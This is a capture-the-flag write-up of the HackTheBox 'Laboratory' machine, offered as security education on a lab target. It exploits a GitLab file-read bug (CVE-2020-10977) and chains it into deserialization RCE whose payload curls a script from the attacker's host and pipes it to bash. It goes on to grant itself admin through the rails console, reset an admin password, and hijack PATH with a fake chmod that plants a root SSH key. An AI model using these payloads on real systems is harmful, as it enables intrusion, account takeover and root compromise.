---
title: "HackTheBox — Laboratory Writeup"
date: 2021-04-23 14:40:00 +0530
categories: [HackTheBox,Linux Machines]
tags: [hackthebox, laboratory, ctf, gitlab, nmap, masscan, vhost, ffuf, cve-2020-10977, hackerone, lfi, Arbitrary-file-read, deserialization, ruby, rails, console, ssh, irb, path-hijack, suid, root ]
image: /assets/img/Posts/Laboratory.png
---

> Laboratory starts off with discovering an vulnerable GitLab instance running on the box. We'll refer an HackerOne report to exploit a CVE associated with it to get Arbitrary file read vulnerability and chain it to get obtain Remote Code execution on the GitLab container. Next we make use of Gitlab rails console to manipulate active user data and gain access to admin's private repository, where we discover an SSH key. For escalating privileges to root we exploit a SUID binary which doesn't call `chmod` binary from it's absolute path, we forge an malicious chmod binary, update the PATH which results it to run as root.

## Reconnaissance

### masscan

Initial Port scanning using `masscan` and `nmap` :

```shell
cfx:  ~/Documents/htb/laboratory
→ masscan -e tun0 -p1-65535 --rate 500 10.10.10.216 | tee masscan.ports

Starting masscan 1.0.5 (http://bit.ly/14GZzcT) at 2020-11-15 19:08:30 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning 1 hosts [65535 ports/host]
Discovered open port 22/tcp on 10.10.10.216
Discovered open port 80/tcp on 10.10.10.216
Discovered open port 443/tcp on 10.10.10.216
```

### nmap

```shel
cfx:  ~/Documents/htb/laboratory
→ nmap -sC -sV -p22,80,443 10.10.10.216
Starting Nmap 7.91 ( https://nmap.org ) at 2020-11-16 01:24 IST
Nmap scan report for laboratory.htb (10.10.10.216)
Host is up (0.075s latency).

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 25:ba:64:8f:79:9d:5d:95:97:2c:1b:b2:5e:9b:55:0d (RSA)
|   256 28:00:89:05:55:f9:a2:ea:3c:7d:70:ea:4d:ea:60:0f (ECDSA)
|_  256 77:20:ff:e9:46:c0:68:92:1a:0b:21:29:d1:53:aa:87 (ED25519)
80/tcp  open  http     Apache httpd 2.4.41
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Did not follow redirect to https://laboratory.htb/
443/tcp open  ssl/http Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: The Laboratory
| ssl-cert: Subject: commonName=laboratory.htb
| Subject Alternative Name: DNS:git.laboratory.htb
| Not valid before: 2020-07-05T10:39:28
|_Not valid after:  2024-03-03T10:39:28
| tls-alpn:
|_  http/1.1
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.61 seconds
```

Port Scan Summary :

- Port 22 - SSH
- Port 80 - HTTP
- Port 443 - HTTPS

Looking at the `nmap` results we can see TLS certificate has DNS entries `laboratory.htb` and `git.laboratory.htb` hence we add both the virtual hosts to `/etc/hosts`

### Port 443 : Website

Visiting the site on Port 80 redirects us to HTTPS website :

![website](/assets/img/Posts/Laboratory/website.png)

Website is titled as **The Laboratory** - Cyber Security services provider

Fuzzing through the website manually and ffuf didn't reveal anything interesting.

### Port 443 : GitLab

At `git.laboratory.htb` we find an instance of GitLab community edition

![gitlab](/assets/img/Posts/Laboratory/gitlab.png)

Since we don't have any creds or usernames associated with this box yet, we will use the `Register` functionality to register ourselves an account.

The Register functionality seems to accept registrations with email domain `laboratory.htb` hence we use `cfx@laboratory.htb`

![register](/assets/img/Posts/Laboratory/register.png)

Once logged in, under Projects -> Explore projects we find an project named **SecureWebsite**

![explore](/assets/img/Posts/Laboratory/explore.png)

Looking at the project contents, it appears to be source code of the **The Laboratory** website which doesn't include anything sensitive.

![source](/assets/img/Posts/Laboratory/source.png)

Project is owned by **Dexter McPherson** with username **dexter** which could be a potential user on the box.

![owner](/assets/img/Posts/Laboratory/owner.png)

#### GitLab Version

Help page discloses GitLab's version which is `GitLab Community Edition 12.8.1` :

![version](/assets/img/Posts/Laboratory/version.png)

#### Vulnerability - CVE-2020-10977

Searching for vulnerabilities associated with GitLab 12.8.1 we come across `CVE-2020-10977` which is a Arbitrary file read vulnerability.

## Shell as git

There is a [**HackerOne Report**](https://hackerone.com/reports/827052) which we will refer to exploit this vulnerability.

### LFI

Step 1 : First we create two projects:

![s1](/assets/img/Posts/Laboratory/s1.png)

Step 2 : Next, We go to project `cold` create an issue with LFI payload in the description:

`![a](/uploads/11111111111111111111111111111111/../../../../../../../../../../../../../../etc/passwd)`

![s2](/assets/img/Posts/Laboratory/s2.png)

Step 3 : After submitting the issue, use the `Move` option situated at lower right side and select project `fusion`:

![s3](/assets/img/Posts/Laboratory/s3.png)

Step 4 : We'll find the file linked to the second project issue :

![s4](/assets/img/Posts/Laboratory/s4.png)

Clicking on it downloads the file:

```shell
cfx:  ~/Documents/htb/laboratory
→ cat passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
[..SNIP..]
git:x:998:998::/var/opt/gitlab:/bin/sh
gitlab-www:x:999:999::/var/opt/gitlab/nginx:/bin/false
gitlab-redis:x:997:997::/var/opt/gitlab/redis:/bin/false
gitlab-psql:x:996:996::/var/opt/gitlab/postgresql:/bin/sh
mattermost:x:994:994::/var/opt/gitlab/mattermost:/bin/sh
registry:x:993:993::/var/opt/gitlab/registry:/bin/sh -
gitlab-prometheus:x:992:992::/var/opt/gitlab/prometheus:/bin/sh -
gitlab-consul:x:991:991::/var/opt/gitlab/consul:/bin/sh -
```

### LFI -> RCE

The [**HackerOne Report**](https://hackerone.com/reports/827052) also shows how we can leverage LFI to Remote Code Execution which exploits Deserialization vulnerability inside `experimentation_subject_id` cookie.

Step 1 : Grabbing `secrets.yml` :

To administer RCE attack first we need to grab `/opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml` file which we can do by replicating the LFI attack with the follow payload:

`![a](/uploads/11111111111111111111111111111111/../../../../../../../../../../../../../../opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml)`

```yml
cfx:  ~/Documents/htb/laboratory
→ cat secrets.yml
# This file is managed by gitlab-ctl. Manual changes will be
# erased! To change the contents below, edit /etc/gitlab/gitlab.rb
# and run `sudo gitlab-ctl reconfigure`.

---
production:
  db_key_base: 627773a77f567a5853a5c6652018f3f6e41d04aa53ed1e0df33c66b04ef0c38b88f402e0e73ba7676e93f1e54e425f74d59528fb35b170a1b9d5ce620bc11838
  secret_key_base: 3231f54b33e0c1ce998113c083528460153b19542a70173b4458a21e845ffa33cc45ca7486fc8ebb6b2727cc02feea4c3adbe2cc7b65003510e4031e164137b3
  otp_key_base: db3432d6fa4c43e68bf7024f3c92fea4eeea1f6be1e6ebd6bb6e40e930f0933068810311dc9f0ec78196faa69e0aac01171d62f4e225d61e0b84263903fd06af
  openid_connect_signing_key: |
    -----BEGIN RSA PRIVATE KEY-----
    MIIJKQIBAAKCAgEA5LQnENotwu/SUAshZ9vacrnVeYXrYPJoxkaRc2Q3JpbRcZTu
    YxMJm2+5ZDzaDu5T4xLbcM0BshgOM8N3gMcogz0KUmMD3OGLt90vNBq8Wo/9cSyV
    RnBSnbCl0EzpFeeMBymR8aBm8sRpy7+n9VRawmjX9os25CmBBJB93NnZj8QFJxPt
[..SNIP..]
```
The `secret_key_base` value is the one in which we are interested to execute this attack.

```yml
  secret_key_base: 3231f54b33e0c1ce998113c083528460153b19542a70173b4458a21e845ffa33cc45ca7486fc8ebb6b2727cc02feea4c3adbe2cc7b65003510e4031e164137b3
```

Step 2 : Replicating the GitLab CE 12.8.1 Environment

Next, to build the Deserialization payload we need to spin off a replica of vulnerable GitLab instance. We'll use docker to do so.

- Installing docker               : `sudo apt install docker.io`
- Pulling Vulnerable GitLab Image : `docker pull gitlab/gitlab-ce:12.8.1-ce.0`
- Running Docker Image            : `docker run gitlab/gitlab-ce:12.8.1-ce.0`

It will take few mins to run the container to start, in a new terminal we can check the docker process and simultaneously get a shell on it.

```shell
cfx:  ~/Documents/htb/laboratory
→ docker ps
CONTAINER ID        IMAGE                          COMMAND             CREATED             STATUS                             PORTS                     NAMES
55c5745c3e56        gitlab/gitlab-ce:12.8.1-ce.0   "/assets/wrapper"   29 seconds ago      Up 24 seconds (health: starting)   22/tcp, 80/tcp, 443/tcp   friendly_volhard

cfx:  ~/Documents/htb/laboratory
→ docker exec -it friendly_volhard /bin/bash

root@55c5745c3e56:/# ls
RELEASE  assets  bin  boot  dev  etc  home  lib  lib64  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var
```

Step 3 : Replacing `secret_key_base` in our own GitLab instance :

Next we need to replace the value of `secret_key_base` inside `/opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml`
with the one we got:

`secret_key_base: 3231f54b33e0c1ce998113c083528460153b19542a70173b4458a21e845ffa33cc45ca7486fc8ebb6b2727cc02feea4c3adbe2cc7b65003510e4031e164137b3`

```yml
root@55c5745c3e56:/# cat /opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml
# This file is managed by gitlab-ctl. Manual changes will be
# erased! To change the contents below, edit /etc/gitlab/gitlab.rb
# and run `sudo gitlab-ctl reconfigure`.

---
production:
  db_key_base: 1d72fbc9d369dca31357808e440be37d793ae1f1dd526cec9bd9cac74567c3eadbb34e8cfa61aa443e3b5f374afb3a5c12f279bc2fd6e30cf675962e0805afa5
  secret_key_base: 3231f54b33e0c1ce998113c083528460153b19542a70173b4458a21e845ffa33cc45ca7486fc8ebb6b2727cc02feea4c3adbe2cc7b65003510e4031e164137b3
  otp_key_base: 49aa7a32e98f1781455387cc636958cf8e270dd9f3caf1e7381b0d0327d255b3ab4ce9e052e2fe428fa91661a5e9a222365710bc007ef5e4bcf92cdc78639981
  openid_connect_signing_key: |
    -----BEGIN RSA PRIVATE KEY-----
    MIIJKQIBAAKCAgEA5IsR3b8jGt7wTpQh98HqX09hpyLO+SXRwsa0eLGUL8KnY/5b
    KgQSQ1WW3re6g5Q534duvUltf0O3Yhk9Daq6J8bRTJX+tbOZKdGw00Qbyt9zjCf5
[..SNIP..]
```

Step 4 : Generating Payload

Next we need to run the following command in `rails console` :

```ruby
request = ActionDispatch::Request.new(Rails.application.env_config)
request.env["action_dispatch.cookies_serializer"] = :marshal
cookies = request.cookie_jar
erb = ERB.new("<%= `curl http://10.10.14.24:8080/rev.bash | bash` %>")
depr = ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new(erb, :result, "@result", ActiveSupport::Deprecation.new)
cookies.signed[:cookie] = depr
puts cookies[:cookie]
```

```shell
root@55c5745c3e56:/# gitlab-rails console
--------------------------------------------------------------------------------
 GitLab:       12.8.1 (d18b43a5f5a) FOSS
 GitLab Shell: 11.0.0
 PostgreSQL:   10.12
--------------------------------------------------------------------------------
Loading production environment (Rails 6.0.2)
irb(main):001:0> request = ActionDispatch::Request.new(Rails.application.env_config)
=> #<ActionDispatch::Request:0x00007ff69e3917b8 @env={"action_dispatch.parameter_filter"=>[/token$/, /password/, /secret/, /key$/, /^body$/, /^description$/, /^note$/, /^text$/, /^title$/, :certificate, :encrypted_key, :hook, :import_url, :otp_attempt, :sentry_dsn, :trace, :variables, :content, :sharedSecret, /^((?-mix:client_secret|code|authentication_token|access_token|refresh_token))$/], "action_dispatch.redirect_filter"=>[], "action_dispatch.secret_key_base"=>"3231f54b33e0c1ce998113c083528460153b19542a70173b4458a21e845ffa33cc45ca7486fc8ebb6b2727cc02feea4c3adbe2cc7b65003510e4031e164137b3", "action_dispatch.show_exceptions"=>true, "action_dispatch.show_detailed_exceptions"=>false,
[..SNIP..]

irb(main):002:0> request.env["action_dispatch.cookies_serializer"] = :marshal
=> :marshal

irb(main):003:0> cookies = request.cookie_jar
=> #<ActionDispatch::Cookies::CookieJar:0x00007ff69eb70e98 @set_cookies={}, @delete_cookies={}, @request=#<ActionDispatch::Request:0x00007ff69e3917b8 @env={"action_dispatch.parameter_filter"=>[/token$/, /password/, /secret/, /key$/, /^body$/, /^description$/, /^note$/, /^text$/, /^title$/, :certificate, :encrypted_key, :hook, :import_url, :otp_attempt, :sentry_dsn, :trace, :variables, :content, :sharedSecret, /^((?-mix:client_secret|code|authentication_token|access_token|refresh_token))$/], "action_dispatch.redirect_filter"=>[], "action_dispatch.secret_key_base"=>"3231f54b33e0c1ce998113c083528460153b19542a70173b4458a21e845ffa33cc45ca7486fc8ebb6b2727cc02feea4c3adbe2cc7b65003510e4031e164137b3", "action_dispatch.show_exceptions"=>true, "action_dispatch.show_detailed_exceptions"=>false,
[..SNIP..]
```

Setting up the payload, Initially when I did this box I had difficulties sending reverse shell payload directly so Here I'll curl a file `rev.bash` which contains Python reverse shell from my Web server and pipe it to bash:

```ruby
irb(main):004:0> erb = ERB.new("<%= `curl http://10.10.14.24:8080/rev.bash | bash` %>")
=> #<ERB:0x00007ff699607498 @safe_level=nil, @src="#coding:UTF-8\n_erbout = +''; _erbout.<<(( `curl http://10.10.14.24:8080/rev.bash | bash` ).to_s); _erbout", @encoding=#<Encoding:UTF-8>, @frozen_string=nil, @filename=nil, @lineno=0>
```

Here next two commands tries to fetch the file and run the payload here itself, so we shouldn't run the webserver while executing these commands, also In case you are sending reverse shell payload directly then it's advised not to run the listener while sending these commands:

```ruby
irb(main):005:0> depr = ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new(erb, :result, "@result", ActiveSupport::Deprecation.new)
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0curl: (7) Failed to connect to 10.10.14.24 port 8080: Connection refused
=> ""

irb(main):006:0> cookies.signed[:cookie] = depr
DEPRECATION WARNING: @result is deprecated! Call result.is_a? instead of @result.is_a?. Args: [Hash] (called from irb_binding at (irb):7)
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0curl: (7) Failed to connect to 10.10.14.24 port 8080: Connection refused
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0curl: (7) Failed to connect to 10.10.14.24 port 8080: Connection refused
=> ""
```

Finally generating cookie value:

```ruby
irb(main):007:0> puts cookies[:cookie]
BAhvOkBBY3RpdmVTdXBwb3J0OjpEZXByZWNhdGlvbjo6RGVwcmVjYXRlZEluc3RhbmNlVmFyaWFibGVQcm94eQk6DkBpbnN0YW5jZW86CEVSQgs6EEBzYWZlX2xldmVsMDoJQHNyY0kibiNjb2Rpbmc6VVRGLTgKX2VyYm91dCA9ICsnJzsgX2VyYm91dC48PCgoIGBjdXJsIGh0dHA6Ly8xMC4xMC4xNC4yNDo4MDgwL3Jldi5iYXNoIHwgYmFzaGAgKS50b19zKTsgX2VyYm91dAY6BkVGOg5AZW5jb2RpbmdJdToNRW5jb2RpbmcKVVRGLTgGOwpGOhNAZnJvemVuX3N0cmluZzA6DkBmaWxlbmFtZTA6DEBsaW5lbm9pADoMQG1ldGhvZDoLcmVzdWx0OglAdmFySSIMQHJlc3VsdAY7ClQ6EEBkZXByZWNhdG9ySXU6H0FjdGl2ZVN1cHBvcnQ6OkRlcHJlY2F0aW9uAAY7ClQ=--c13c402abdc9f0aabfd22f5544ab2d713e509334
=> nil
irb(main):009:0> quit
```

Step 5 : Execution

Now that we have the cookie value ready we will run the `curl` command to drop us a reverse shell:

```shell
cfx:  ~/Documents/htb/laboratory
→ curl -vvv -k 'https://git.laboratory.htb/users/sign_in' -b "experimentation_subject_id=BAhvO
kBBY3RpdmVTdXBwb3J0OjpEZXByZWNhdGlvbjo6RGVwcmVjYXRlZEluc3RhbmNlVmFyaWFibGVQcm94eQk6DkBpbnN0YW5
jZW86CEVSQgs6EEBzYWZlX2xldmVsMDoJQHNyY0kibiNjb2Rpbmc6VVRGLTgKX2VyYm91dCA9ICsnJzsgX2VyYm91dC48P
CgoIGBjdXJsIGh0dHA6Ly8xMC4xMC4xNC4yNDo4MDgwL3Jldi5iYXNoIHwgYmFzaGAgKS50b19zKTsgX2VyYm91dAY6BkV
GOg5AZW5jb2RpbmdJdToNRW5jb2RpbmcKVVRGLTgGOwpGOhNAZnJvemVuX3N0cmluZzA6DkBmaWxlbmFtZTA6DEBsaW5lb
m9pADoMQG1ldGhvZDoLcmVzdWx0OglAdmFySSIMQHJlc3VsdAY7ClQ6EEBkZXByZWNhdG9ySXU6H0FjdGl2ZVN1cHBvcnQ
6OkRlcHJlY2F0aW9uAAY7ClQ=--c13c402abdc9f0aabfd22f5544ab2d713e509334"
```

Make sure to start the webserver and nc listener before executing the curl command:

![shell](/assets/img/Posts/Laboratory/shell.png)

```shell
cfx:  ~/Documents/htb/laboratory
→ nc -lvnp 4444
Ncat: Version 7.91 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.10.10.216.
Ncat: Connection from 10.10.10.216:57334.
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=998(git) gid=998(git) groups=998(git)
$ python3 -c "import pty;pty.spawn('/bin/bash')"
git@git:~/gitlab-rails/working$
```

## Shell as dexter

### Enumeration

Initial enumeration confirms we are inside a docker container:

```shell
git@git:/$ hostname -i
172.17.0.2
git@git:/$ hostname
git.laboratory.htb
```

Also, there is `.dockerenv` to confirm the same

```shell
git@git:/$ ls -la
total 88
drwxr-xr-x   1 root root 4096 Jul  2  2020 .
drwxr-xr-x   1 root root 4096 Jul  2  2020 ..
-rwxr-xr-x   1 root root    0 Jul  2  2020 .dockerenv
-rw-r--r--   1 root root  157 Feb 24  2020 RELEASE
drwxr-xr-x   2 root root 4096 Feb 24  2020 assets
drwxr-xr-x   1 root root 4096 Feb 24  2020 bin
drwxr-xr-x   2 root root 4096 Apr 12  2016 boot
drwxr-xr-x   5 root root  340 Apr 21 05:04 dev
drwxr-xr-x   1 root root 4096 Jul  2  2020 etc
[..SNIP..]
```

Now our next approach should be to either escape this container or elevate privileges to root in this container, however none of it was possible here.

### GitLab - SecureDocker Project access

Since we are inside GitLab container, we can make of use Gitlab-rails console to manipulate GitLab user data:

Here are some Cheatsheet which I referred initially : [**Cheatsheet1**](https://docs.gitlab.com/ee/administration/troubleshooting/gitlab_rails_cheat_sheet.html) & [**Cheatsheet**](https://docs.gitlab.com/ee/security/reset_user_password.html)

#### Admin Priv - Self

Firstly, We can grant ourself admin privilege:

```ruby
git@git:~$ gitlab-rails console
--------------------------------------------------------------------------------
 GitLab:       12.8.1 (d18b43a5f5a) FOSS
 GitLab Shell: 11.0.0
 PostgreSQL:   10.12
--------------------------------------------------------------------------------
Loading production environment (Rails 6.0.2)
irb(main):001:0> User.active
User.active
=> #<ActiveRecord::Relation [#<User id:4 @seven>, #<User id:1 @dexter>, #<User id:5 @tuser>, #<User id:6 @cfx>]>
irb(main):002:0> User.admins
User.admins
=> #<ActiveRecord::Relation [#<User id:1 @dexter>]>
irb(main):003:0> cfx.admin = true
cfx.admin = true
irb(main):004:0> cfx.save
cfx.save
=> true
```
![adm](/assets/img/Posts/Laboratory/adm.png)

Now we can see admin icon on our account, as a result we can now access Dexter's `SecureDocker` Project.

#### Password reset - Dexter

We saw Dexter is the only admin, so we can even reset his password:

```ruby
git@git:/$ gitlab-rails console
--------------------------------------------------------------------------------
 GitLab:       12.8.1 (d18b43a5f5a) FOSS
 GitLab Shell: 11.0.0
 PostgreSQL:   10.12
--------------------------------------------------------------------------------
Loading production environment (Rails 6.0.2)

irb(main):001:0> user = User.where(id: 1).first
=> #<User id:1 @dexter>
irb(main):002:0> user.password = 'cold_fusion'
=> "cold_fusion"
irb(main):003:0> user.password_confirmation = 'cold_fusion'
=> "cold_fusion"
irb(main):004:0> user.save!
Enqueued ActionMailer::DeliveryJob (Job ID: f4543159-759e-4879-885e-8688d65ec401) to Sidekiq(mailers) with arguments: "DeviseMailer", "password_change", "deliver_now", #<GlobalID:0x00007fa1b4dcbda8 @uri=#<URI::GID gid://gitlab/User/1>>
=> true
irb(main):005:0> exit()
```

### SSH - Dexter

Now we can login to GitLab as dexter where we see another Project `SecureDocker` :

![dexter](/assets/img/Posts/Laboratory/dexter.png)

Inside project, first thing we find is an `todo.txt` which seems to be some kind of pending task list:

```shell
# DONE: Secure docker for regular users
### DONE: Automate docker security on startup
# TODO: Look into "docker compose"
# TODO: Permanently ban DeeDee from lab
```

On first glance it doesnt make much sense so we'll look into later.

But what's more interesting is that folder dexter contains an `.ssh` folder with an private ssh key:

![ssh](/assets/img/Posts/Laboratory/ssh.png)

Using this key we can SSH as dexter:

```shell
cfx:  ~/Documents/htb/laboratory
→ ssh -i id_rsa dexter@10.10.10.216
dexter@laboratory:~$ id
uid=1000(dexter) gid=1000(dexter) groups=1000(dexter)
dexter@laboratory:~$ whoami
dexter
```

Grabbing `user.txt`:

```shell
dexter@laboratory:~$ cat user.txt
7c447991fdff874*****************

```

## PrivEsc dexter ->  root

### Enumeration

Searching for `SUID` binaries we find one in `/usr/local/bin/`

> /usr/local/bin is the location for all add-on executables that you add to the system to be used as common system files by all users but, are not official files supported by the OS.

```shell
dexter@laboratory:~$ find / -perm -u=s -type f 2>/dev/null | grep -v 'snap' | xargs ls -la
-rwsr-sr-x 1 daemon daemon      55560 Nov 12  2018 /usr/bin/at
-rwsr-xr-x 1 root   root        85064 May 28  2020 /usr/bin/chfn
-rwsr-xr-x 1 root   root        53040 May 28  2020 /usr/bin/chsh
-rwsr-xr-x 1 root   root        39144 Mar  7  2020 /usr/bin/fusermount
-rwsr-xr-x 1 root   root        88464 May 28  2020 /usr/bin/gpasswd
-rwsr-xr-x 1 root   root        55528 Apr  2  2020 /usr/bin/mount
-rwsr-xr-x 1 root   root        44784 May 28  2020 /usr/bin/newgrp
-rwsr-xr-x 1 root   root        68208 May 28  2020 /usr/bin/passwd
-rwsr-xr-x 1 root   root        31032 Aug 16  2019 /usr/bin/pkexec
-rwsr-xr-x 1 root   root        67816 Apr  2  2020 /usr/bin/su
-rwsr-xr-x 1 root   root       166056 Jan 19 14:21 /usr/bin/sudo
-rwsr-xr-x 1 root   root        39144 Apr  2  2020 /usr/bin/umount
-rwsr-xr-- 1 root   messagebus  51344 Jun 11  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root   root        14488 Jul  8  2019 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root   root       473576 May 29  2020 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root   root        22840 Aug 16  2019 /usr/lib/policykit-1/polkit-agent-helper-1
-rwsr-xr-x 1 root   dexter      16720 Aug 28  2020 /usr/local/bin/docker-security
```

`/usr/local/bin/docker-security` looks to be something which was mentioned in `todo.txt` so probably this is our next target.

But on running it nothing happens:

```shell
dexter@laboratory:~$ docker-security
dexter@laboratory:~$
```

So we can run it with `ltrace` :

```shell
dexter@laboratory:~$ ltrace docker-security
setuid(0)                                                                                                                         = -1
setgid(0)                                                                                                                         = -1
system("chmod 700 /usr/bin/docker"/tmp/chmod: 1: cannot create /root/.ssh/authorized_keys: Permission denied
 <no return ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                                                                                            = 512
system("chmod 660 /var/run/docker.sock"/tmp/chmod: 1: cannot create /root/.ssh/authorized_keys: Permission denied
 <no return ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                                                                                            = 512
+++ exited (status 0) +++
```

Looking at the trace, binary is calling `system("chmod 700 /usr/bin/docker")`. Now the interesting thing to notice is that `chmod` is not called from it's absolute path which should be `/usr/bin/chmod`

```shell
dexter@laboratory:~$ which chmod
/usr/bin/chmod
```

Current path :

```shell
dexter@laboratory:~$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/snap/bin
```

So we can forge `chmod` of our own, update the path and confuse the application execute our `chmod`

I'll create a ssh key using `ssh-keygen -f cfx`:

```shell
dexter@laboratory:/tmp$ cat chmod
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDFJ4KUY9Dzy4UKYRwT+ORSIGW1W2YSKQrqIlNfRksWqWOz3bCJCE5gImrgx/lsL/kItrEvy9js4nQ1zmUrJ6kSYU7[..SNIP..]Rws4b8UeKpU+ft6Uk root@cfx" > /root/.ssh/authorized_keys

dexter@laboratory:/tmp$ chmod +x chmod
dexter@laboratory:/tmp$ export PATH=/tmp:$PATH
```

Updated PATH:

```shell
dexter@laboratory:/tmp$ echo $PATH
/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/snap/bin
```

Here the first path is `/tmp` so next time when we run the binary it will first go inside `/tmp`, fetch and run our malicious `chmod`:

```
dexter@laboratory:/tmp$ /usr/local/bin/docker-security
```

This should have successfully copied our public ssh key to `/root/.ssh/authorized_keys` as a result we can SSH as root with out private key:

### SSH - root

```shell
cfx:  ~/Documents/htb/docker
→ ssh -i cfx root@10.10.10.216
root@laboratory:~# id
uid=0(root) gid=0(root) groups=0(root)
root@laboratory:~# whoami
root
```

Grabbing `root.txt`:

```shell
root@laboratory:~# cat root.txt
0bc02b1afb2b28******************

```

And we pwned the Box !

Thanks for reading, Suggestions & Feedback are appreciated !
